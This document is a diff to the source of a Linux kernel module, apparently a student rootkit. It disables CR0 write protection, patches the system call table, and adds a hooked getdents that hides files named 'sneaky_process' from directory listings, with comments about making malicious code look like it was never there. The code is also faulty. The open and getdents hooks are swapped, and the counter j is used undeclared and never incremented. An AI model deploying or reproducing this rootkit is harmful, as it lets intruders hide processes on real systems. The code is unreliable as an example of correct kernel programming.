@@ -20,7 +20,8 @@
 */
 //#include <dirent.h>
 #define BUFFLEN 1024
-
+#define SNEAKY "sneaky_process"
+#define SNEAKY_SIZE sizeof(SNEAKY)
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -65,41 +66,62 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
+  //printk(KERN_INFO "Very, very Sneaky!\n");
   return original_call(pathname, flags);
 }
 
 
 asmlinkage int (*getdents_original)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
+
+
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
   printk(KERN_INFO "Sneaky Get DENTS!\n");
-
+  
   //initial Direct structure
   struct linux_dirent *dir;
 
   //cast dirent structure to char * to manipulate byte by byte
-  char *exact = (char *) dir;
+  char *exact = (char *) dirp;
   //allocate memory for count bytes associated with all dirents read for specific file descriptor 
   //we are in kernel space so allocate memory from kernel memory
   char *mem = kmalloc(count, GFP_KERNEL);
-
-  //Need to allow kernel addresses to span Kernel Virtual Memory space with below lines
+  //We ran out of kernel space --> send back correct Kernel Error Macro
+  if (mem == NULL) {
+    return -ENOMEM;
+  }
   
-
-  //save previous address space value: want this restored so we don't give access to Kernel address space
-  //beyond our below system calls
+  //save previous address space value for user space
   mm_segment_t userspace = get_fs();
-  //the below macro allows us to pass addresses derived from Kernel Space to our system calls 
+  // pass addresses derived from Kernel Space to our system calls 
   set_fs(KERNEL_DS);
-  //we cast as dirent but have as char * so we can increment byte stream 1 byte at a time
-  int numbytes = getdents_original(fd, (struct linux_dirent*) exact, count);
+  //syscall
+  long numbytes = getdents_original(fd, (struct linux_dirent*) mem, count);
   //ensure addresses are once again only in user space
   set_fs(userspace);
 
-  //iterate through numbytes and compare name to "Sneaky_Process" --> skip that one before returning
-  
+  //iterate through numbytes
+  for (long i = j = 0; i < numbytes; i+= dir->d_reclen) {
+    dir = (struct linux_dirent *) (mem + i);
+    
+    //Dirent name matches our executable name --> DO NOT COPY TO USER SPACE
+    if(strncmp(dir->d_name, SNEAKY, SNEAKY_SIZE) == 0) {
+      continue;
+    }
+    if (copy_to_user(exact + j, dir, dir->d_reclen)) {
+      //numbytes = -EAGAIN;
+      kfree(mem);
+      return -EAGAIN;
+    }
+  }
+  //changes numbytes to j
+  if (numbytes > 0) {
+    numbytes = j;
+  }
+
+  //deallocate and return
+  kfree(mem);
   return numbytes;
 }
 
@@ -124,14 +146,20 @@ static int initialize_sneaky_module(void)
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
   original_call = (void*)*(sys_call_table + __NR_open);
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  *(sys_call_table + __NR_open) = (unsigned long)sneaky_getdents;
 
+  //GetDents swap
+  getdents_original = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_open;
+
+  
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 
-  printk(KERN_ALERT "Hello process ID is: %i!\n", pid);
+  printk(KERN_ALERT "Process ID is: %i!\n", pid);
 
   return 0;       // to show a successful load 
 }  
@@ -156,6 +184,10 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
 
+  //Restore GetDents
+  *(sys_call_table + __NR_getdents) = (unsigned long)getdents_original;
+
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
